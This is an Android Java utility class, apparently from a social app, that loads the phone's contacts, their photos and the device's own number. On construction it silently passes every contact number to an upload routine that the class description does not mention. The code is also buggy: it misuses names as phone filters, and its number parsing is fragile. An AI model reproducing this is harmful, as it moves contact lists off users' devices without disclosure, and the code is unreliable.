
package com.wzAdmin.buddy.utils;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

/**
 * @ClassName: PhoneUtils
 * @Description: 获取联系人和本机号码
 * @author woodhome
 * @date 2013-5-8 下午04:09:14
 * 版权所有 woodhome
 */
public class PhoneUtils {
	static PhoneUtils mInstance = null;
	
	public static final String PHONE = "phone";
	public static final String NAME = "name";
	public static final String IMAGE = "image";
	
	List< Map< String , Object> > mPhoneData;
	Context mContext; 

	private PhoneUtils(Context context ){
		mPhoneData = new ArrayList< Map< String , Object> >();
		mContext = context;
		loadContact(context);
	}
	
	public static PhoneUtils getInstance(Context context){
		if(null == mInstance)
			mInstance = new PhoneUtils(context);
		return mInstance;
	}
	
	public List< Map< String , Object> > getContacts(){
		return mPhoneData;
	}
	
	public String getPhoneNumber(){
		TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getLine1Number();
	}
	
	private void loadContact(Context context){
		final int COL_PHONE_NUMBER = 0;  
		final int COL_PHONE_NAME = 1;  
		String[] projection = new String[]{
			ContactsContract.CommonDataKinds.Phone.NUMBER,  
		    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
		};
		Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
				projection, null, null, "sort_key_alt");
		if(cursor.moveToFirst()){
			do{
				Map< String , Object> item = new HashMap< String , Object >();
				String strPhoneNumber = cursor.getString(COL_PHONE_NAME);
				item.put(NAME, strPhoneNumber);
				item.put(PHONE, cursor.getString(COL_PHONE_NUMBER));
				
	            Uri uriNumber2Contacts = Uri  
                .parse("content://com.android.contacts/"  
                        + "data/phones/filter/" + strPhoneNumber);  
		        Cursor cursorCantacts = context.getContentResolver().query(uriNumber2Contacts, null, null,  
		                        null, null);  
		        if (cursorCantacts.getCount() > 0) {   
		            cursorCantacts.moveToFirst();  
		            Long contactID = cursorCantacts.getLong(cursorCantacts  
		                    .getColumnIndex("contact_id"));  
		            Uri uri = ContentUris.withAppendedId(  
		                    ContactsContract.Contacts.CONTENT_URI, contactID);  
		            InputStream input = ContactsContract.Contacts  
		                    .openContactPhotoInputStream(context.getContentResolver(), uri);  
		           Bitmap btContactImage = BitmapFactory.decodeStream(input);
		           item.put(IMAGE, btContactImage);
		           mPhoneData.add(item);
		        }
			}while(cursor.moveToNext());
		}
		long[] contacts = new long[mPhoneData.size()];
		for(int i = 0; i < contacts.length ; i++){
			String str = (String)mPhoneData.get(i).get(PHONE);
			contacts[i]=Long.parseLong(str, 10);
		}
		NetUtils.UploadContact(contacts);
	}
}
